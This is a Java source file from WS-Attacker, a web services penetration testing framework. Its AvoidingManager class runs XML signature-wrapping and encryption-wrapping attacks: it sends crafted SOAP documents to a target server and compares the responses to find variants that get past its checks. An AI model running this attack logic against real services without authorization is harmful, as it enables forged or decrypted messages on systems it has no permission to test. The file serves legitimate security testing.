/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

package wsattacker.library.xmlencryptionattack.avoidingengine;

import java.util.ArrayList;
import java.util.List;
import javax.xml.namespace.QName;
import javax.xml.xpath.XPathExpressionException;
import org.apache.log4j.Logger;
import org.apache.ws.security.WSConstants;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.SAXException;
import uk.ac.shef.wit.simmetrics.similaritymetrics.InterfaceStringMetric;
import wsattacker.library.schemaanalyzer.SchemaAnalyzer;
import wsattacker.library.signatureWrapping.option.Payload;
import wsattacker.library.signatureWrapping.util.exception.InvalidPayloadException;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.signatureWrapping.util.signature.SignatureManager;
import wsattacker.library.signatureWrapping.xpath.weakness.util.WeaknessLog;
import wsattacker.library.signatureWrapping.xpath.wrapping.WrappingOracle;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.EncSigWrappingOracle;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.EncryptionWrappingOracle;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.WrappingOracleIF;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.FactoryWeakness;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.WeaknessType;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionmanager.DetectFilterEnum;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionmanager.FactoryFilter;
import wsattacker.library.xmlencryptionattack.detectionengine.detectionstreams.DetectionReport;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.concrete.AvoidedDocErrorFilter;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.AbstractDetectionInfo;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.AvoidedDocErrorInfo;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.SignatureInfo;
import wsattacker.library.xmlencryptionattack.detectionengine.filter.info.TimestampInfo;
import wsattacker.library.xmlencryptionattack.encryptedelements.AbstractEncryptionElement;
import wsattacker.library.xmlencryptionattack.encryptedelements.ElementAttackProperties;
import wsattacker.library.xmlencryptionattack.timestampelement.TimestampBase;
import wsattacker.library.xmlencryptionattack.timestampelement.TimestampElement;
import wsattacker.library.xmlencryptionattack.util.ServerSendCommandIF;
import wsattacker.library.xmlencryptionattack.util.SimStringStrategyFactory;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.NO_CURR_WRAP_IDX;
import wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.WrappingAttackMode;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.WrappingAttackMode.NO_WRAP;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import static wsattacker.library.xmlutilities.namespace.NamespaceConstants.URI_NS_DS;

public class AvoidingManager
{
    private final DetectionReport m_DetectionReport;

    private final Document m_InputFile;

    private double m_WrapErrCmpThreshold = 1.0;

    private Document m_AvoidedFile;

    private final AvoidedDocErrorFilter m_AvoiDocErrFilter;

    private final AbstractEncryptionElement m_EncryptedWrapPay;

    private AbstractEncryptionElement m_AttackPay = null;

    private final SchemaAnalyzer m_SchemaAnalyzer;

    private boolean m_isEncTypeWekaness = false;

    public final static Logger LOG = Logger.getLogger( AvoidingManager.class );

    public AvoidingManager( AbstractEncryptionElement wrapPay, DetectionReport detectRep, SchemaAnalyzer schemaAnalyzer )
        throws InvalidPayloadException, InvalidWeaknessException
    {
        this.m_DetectionReport = detectRep;
        this.m_SchemaAnalyzer = schemaAnalyzer;
        this.m_InputFile = m_DetectionReport.getRawFile();
        this.m_EncryptedWrapPay = wrapPay;

        List<QName> filterList = new ArrayList();
        SignatureInfo sigInfo = (SignatureInfo) m_DetectionReport.getDetectionInfo( DetectFilterEnum.SIGNATUREFILTER );
        /*******************************************************************************************************/
        if ( !sigInfo.getUsedPayloads().isEmpty() )
        {
            // do not wrap in signed element
            for ( Payload payload : sigInfo.getUsedPayloads() )
            {
                Element signedElement = payload.getSignedElement();
                filterList.add( new QName( signedElement.getNamespaceURI(), signedElement.getLocalName() ) );
            }
        }
        /*******************************************************************************************************/

        filterList.add( new QName( URI_NS_DS, "SignedInfo" ) );
        filterList.add( new QName( URI_NS_DS, "SignatureValue" ) );
        schemaAnalyzer.setFilterList( filterList );
        this.m_AvoiDocErrFilter = (AvoidedDocErrorFilter) FactoryFilter.createFilter( DetectFilterEnum.AVOIDDOCFILTER );

    }

    public void setWrapErrCmpThreshold( double wrapErrCmpThreshold )
    {
        this.m_WrapErrCmpThreshold = wrapErrCmpThreshold;
    }

    public AbstractEncryptionElement getAttackPay()
    {
        return m_AttackPay;
    }

    public void setAttackPay( AbstractEncryptionElement attackPay )
    {
        this.m_AttackPay = attackPay;
    }

    public Document getInputFile()
    {
        return m_InputFile;
    }

    public DetectionReport getDetectionReport()
    {
        return m_DetectionReport;
    }

    public Document getAvoidedFile()
    {
        return m_AvoidedFile;
    }

    public void setAvoidedFile( Document avoidedFile )
    {
        this.m_AvoidedFile = avoidedFile;
    }

    public AvoidedDocErrorInfo getAvoidedDocument( WrappingAttackMode wrapMode, ServerSendCommandIF serverSendCmd )
        throws InvalidWeaknessException, InvalidPayloadException, SAXException, XPathExpressionException
    {
        AbstractDetectionInfo errorInfo = null;
        TimestampBase timestamp = null;
        TimestampInfo timeInfo = (TimestampInfo) m_DetectionReport.getDetectionInfo( DetectFilterEnum.TIMESTAMPFILTER );

        if ( null != timeInfo )
            timestamp = timeInfo.getTimestamp();

        if ( null != timestamp )
        {
            if ( null != timestamp.getDetectionElement() )
            {
                errorInfo = handleTimestamp( timestamp, serverSendCmd, wrapMode );
            }
        }
        else if ( NO_WRAP != wrapMode )
        {
            errorInfo = executeWrappingAttacks( wrapMode, serverSendCmd );
        }

        if ( null == errorInfo )
            return null;
        else
            return (AvoidedDocErrorInfo) errorInfo;
    }

    private AbstractDetectionInfo handleTimestamp( TimestampBase timestamp, ServerSendCommandIF serverSendCmd,
                                                   WrappingAttackMode wrapMode )
        throws InvalidWeaknessException, InvalidPayloadException, XPathExpressionException
    {

        SignatureManager sigManager = null;
        Document avoidedTimeStampDoc = null;
        AbstractDetectionInfo errorInfo = null;
        SignatureInfo sigInfo = (SignatureInfo) m_DetectionReport.getDetectionInfo( DetectFilterEnum.SIGNATUREFILTER );

        if ( null != sigInfo )
            sigManager = sigInfo.getSignatureManager();

        if ( timestamp.isSigned() )
        {
            /*
             * SignatureManager signatureManager = new SignatureManager(); signatureManager.setDocument( m_InputFile );
             * List<Payload> pays = sigManager.getPayloads(); List<QName> filterListOrig =
             * m_SchemaAnalyzer.getFilterList(); List<QName> filterListTimestamp = new ArrayList(); for ( int i = 0;
             * pays.size() > i; i++ ) { if ( !pays.get( i ).isTimestamp() ) { Element signedElement = pays.get( i
             * ).getSignedElement(); filterListTimestamp.add( new QName( signedElement.getNamespaceURI(),
             * signedElement.getLocalName() ) ); pays.remove( i ); } } filterListTimestamp.add( new QName( URI_NS_ENC,
             * "EncryptedKey" ) ); filterListTimestamp.add( new QName( URI_NS_ENC, "EncryptedData" ) );
             * filterListTimestamp.add( new QName( URI_NS_DS, "KeyInfo" ) ); filterListTimestamp.add( new QName(
             * URI_NS_DS, "SignedInfo" ) ); filterListTimestamp.add( new QName( URI_NS_DS, "SignatureValue" ) );
             * m_SchemaAnalyzer.setFilterList( filterListTimestamp ); WrappingOracle wrappingOracle = new
             * WrappingOracle( m_InputFile, pays, m_SchemaAnalyzer ); avoidedTimeStampDoc = getAvoidedTimeStampDoc(
             * wrappingOracle, serverSendCmd, timestamp ); m_SchemaAnalyzer.setFilterList( filterListOrig ); // test if
             * ( null != avoidedTimeStampDoc ) { // TEST LOG.info( "signed timestamp avoided -> init wrapping attacks"
             * ); m_DetectionReport.setRawFile( avoidedTimeStampDoc ); errorInfo = executeWrappingAttacks( wrapMode,
             * serverSendCmd ); } else
             */
            {
                LOG.warn( "signed timestamp could not avoided" );
                errorInfo = executeWrappingAttacks( wrapMode, serverSendCmd );
            }

        }
        else
        {
            errorInfo = executeWrappingAttacks( wrapMode, serverSendCmd );
        }

        return errorInfo;
    }

    private AbstractDetectionInfo executeWrappingAttacks( WrappingAttackMode wrapMode, ServerSendCommandIF serverSendCmd )
        throws InvalidPayloadException, InvalidWeaknessException
    {
        WrappingOracleIF wrappOracle = null;
        AbstractDetectionInfo errorInfo = null;
        ElementAttackProperties attackPayProp = m_EncryptedWrapPay.getAttackProperties();

        if ( ( WrappingAttackMode.SIGNATURE == wrapMode )
            || ( WrappingAttackMode.SIG_ENC_WRAP == wrapMode && WrappingAttackMode.ENCRYPTION != attackPayProp.getCurrWrappingMode() ) )
        {
            try
            {
                attackPayProp.setCurrWrappingMode( WrappingAttackMode.SIGNATURE );
                wrappOracle = new EncSigWrappingOracle( m_EncryptedWrapPay, m_DetectionReport, m_SchemaAnalyzer );
                errorInfo = startWrappingAttack( wrappOracle, serverSendCmd );
            }
            catch ( SAXException ex )
            {
                LOG.error( ex );
            }
        }
        // encryption wrapping attack
        if ( ( WrappingAttackMode.ENCRYPTION == wrapMode || WrappingAttackMode.SIG_ENC_WRAP == wrapMode )
            && null == errorInfo )
        {
            try
            {
                attackPayProp.setCurrWrappingMode( WrappingAttackMode.ENCRYPTION );
                wrappOracle = new EncryptionWrappingOracle( m_EncryptedWrapPay, m_DetectionReport, m_SchemaAnalyzer );
                if ( m_isEncTypeWekaness && 0 < wrappOracle.maxPossibilities() )
                {
                    wrappOracle.addAdditionalEncryptionWeakness( FactoryWeakness.generateWeakness( WeaknessType.ATTR_TYPE_WEAKNESS,
                                                                                                   m_AttackPay, null ) );
                }
                errorInfo = startWrappingAttack( wrappOracle, serverSendCmd );
            }
            catch ( SAXException ex )
            {
                LOG.error( ex );
            }
        }

        return errorInfo;
    }

    private AbstractDetectionInfo startWrappingAttack( WrappingOracleIF wrappingOracle,
                                                       ServerSendCommandIF serverSendCmd )
        throws SAXException, InvalidPayloadException
    {
        TimestampBase timestamp = null;
        AbstractDetectionInfo errorInfo = null;
        String responseContent = null;
        String attackDocumentAsString = null;
        Document attackDocument = null;
        ElementAttackProperties attackPayProp = m_EncryptedWrapPay.getAttackProperties();
        TimestampInfo timeInfo = (TimestampInfo) m_DetectionReport.getDetectionInfo( DetectFilterEnum.TIMESTAMPFILTER );
        if ( null != timeInfo )
            timestamp = timeInfo.getTimestamp();

        int max = wrappingOracle.maxPossibilities();
        int i = attackPayProp.getCurrWrappingPayloadIdx();

        if ( ( max - 1 ) == i )
        {
            attackPayProp.setCurrWrappingPayloadIdx( NO_CURR_WRAP_IDX );
        }

        LOG.info( "Found " + max + " wrapping possibilites." );
        for ( i = i + 1; i < max; ++i )
        {
            LOG.info( "Trying possibility " + ( i + 1 ) + "/" + max );

            try
            {
                attackDocument = wrappingOracle.getPossibility( i );
            }
            catch ( InvalidWeaknessException e )
            {
                LOG.warn( "Could not abuse the weakness. " + e.getMessage() );
                continue;
            }
            catch ( Exception e )
            {
                LOG.error( "Unknown error. " + e.getMessage() );
                continue;
            }

            if ( null != timestamp )
            {
                timestamp.updateTimeStamp( attackDocument );
            }

            LOG.info( WeaknessLog.representation() );
            attackDocumentAsString = DomUtilities.domToString( attackDocument );
            // send wrapping message
            responseContent = serverSendCmd.send( attackDocumentAsString );

            if ( responseContent == null )
            {
                // LOG.trace("Request:\n" + DomUtilities.showOnlyImportant(responseContent));
                LOG.info( "The server's answer was empty. Server misconfiguration?" );
                continue;
            }

            errorInfo = checkIsWrappingMsgValid( attackDocument, responseContent, serverSendCmd );

            if ( null != errorInfo )
            {
                attackPayProp.setCurrWrappingPayloadIdx( i );
                LOG.info( "Possibility " + ( i + 1 ) + ": Wrapping-Document found: \n" + attackDocumentAsString );
                break;
            }
        }

        if ( null == errorInfo )
        {
            attackPayProp.setCurrWrappingPayloadIdx( NO_CURR_WRAP_IDX );
            attackPayProp.setCurrWrappingMode( NO_WRAP );
        }

        return errorInfo;
    }

    private AbstractDetectionInfo checkIsWrappingMsgValid( Document attackDocument, String responseContent,
                                                           ServerSendCommandIF serverSendCmd )
    {
        String attackErrDocumentAsString = null;
        String responseContentError = null;
        AbstractDetectionInfo errorInfo = null;
        ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).setPayloadInput( m_AttackPay );
        ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).setInputDocument( attackDocument );
        errorInfo = ( (AvoidedDocErrorFilter) m_AvoiDocErrFilter ).process();
        attackErrDocumentAsString = DomUtilities.domToString( ( (AvoidedDocErrorInfo) errorInfo ).getErrorDocument() );

        responseContentError = serverSendCmd.send( attackErrDocumentAsString );
        InterfaceStringMetric simStringStrategy =
            SimStringStrategyFactory.createSimStringStrategy( SimStringStrategyFactory.SimStringStrategy.LEVENSTHEIN );
        if ( m_WrapErrCmpThreshold <= simStringStrategy.getSimilarity( responseContent, responseContentError ) )
        {
            errorInfo = null;
        }

        return errorInfo;
    }

    private Document getAvoidedTimeStampDoc( WrappingOracle wrappingOracle, ServerSendCommandIF serverSendCmd,
                                             TimestampBase timestamp )
        throws XPathExpressionException
    {
        int max = wrappingOracle.maxPossibilities();
        AbstractDetectionInfo errorInfo = null;
        String responseContent = null;
        String attackDocumentAsString = null;
        Document attackDocument = null;
        for ( int i = 0; i < max; ++i )
        {
            LOG.info( "Trying possibility " + ( i + 1 ) + "/" + max );

            try
            {
                attackDocument = wrappingOracle.getPossibility( i );
            }
            catch ( InvalidWeaknessException e )
            {
                LOG.warn( "Could not abuse the weakness. " + e.getMessage() );
                continue;
            }
            catch ( Exception e )
            {
                LOG.error( "Unknown error. " + e.getMessage() );
                continue;
            }
            LOG.info( WeaknessLog.representation() );
            attackDocumentAsString = DomUtilities.domToString( attackDocument );
            // send wrapping message
            responseContent = serverSendCmd.send( attackDocumentAsString );
            if ( responseContent == null )
            {
                // LOG.trace("Request:\n" + DomUtilities.showOnlyImportant(responseContent));
                LOG.info( "The server's answer was empty. Server misconfiguration?" );
                continue;
            }

            if ( checkIfTimestampValid( attackDocument, responseContent, serverSendCmd, timestamp ) )
            {
                return attackDocument;
            }
        }

        return null;
    }

    private boolean checkIfTimestampValid( Document attackDocument, String responseContent,
                                           ServerSendCommandIF serverSendCmd, TimestampBase timestamp )
        throws XPathExpressionException
    {
        String attackErrDocumentAsString = null;
        String responseContentError = null;
        // TODO: SAML
        List<Element> timestampList =
            (List<Element>) DomUtilities.evaluateXPath( attackDocument, "//*[local-name()='"
                + WSConstants.TIMESTAMP_TOKEN_LN + "' " + "and namespace-uri()='" + WSConstants.WSU_NS + "']" );
        // TODO -> test if timestamp position in encData(key!?!?) ->filterList
        if ( 2 == timestampList.size() )
        {
            if ( timestampList.get( 0 ).isEqualNode( (Element) timestamp.getDetectionElement() ) )
            {
                timestamp.setTimeStampPayloads( timestampList.get( 1 ) );
            }
            else
            {
                timestamp.setTimeStampPayloads( timestampList.get( 0 ) );
            }
        }
        else
        {
            throw new IllegalArgumentException( "Timestamp-Wrapping without 2 timestamp elements in attack document" );
        }

        Document errDocument = DomUtilities.createNewDomFromNode( attackDocument.getDocumentElement() );
        Element errPayElement = DomUtilities.findCorrespondingElement( errDocument, timestamp.getDetectionPayElement() );
        TimestampElement timestampError = new TimestampElement( errPayElement );
        timestampError.setCreatedValue( "" );
        timestampError.setExpiresValue( "" );
        attackErrDocumentAsString = DomUtilities.domToString( errPayElement );
        responseContentError = serverSendCmd.send( attackErrDocumentAsString );

        InterfaceStringMetric simStringStrategy =
            SimStringStrategyFactory.createSimStringStrategy( SimStringStrategyFactory.SimStringStrategy.DICE_COEFF );
        if ( m_WrapErrCmpThreshold <= simStringStrategy.getSimilarity( responseContent, responseContentError ) )
        {
            return false;
        }

        return true;
    }

    public void setUseEncTypeWeakness( boolean encTypeWeakness )
    {
        this.m_isEncTypeWekaness = encTypeWeakness;
    }

}
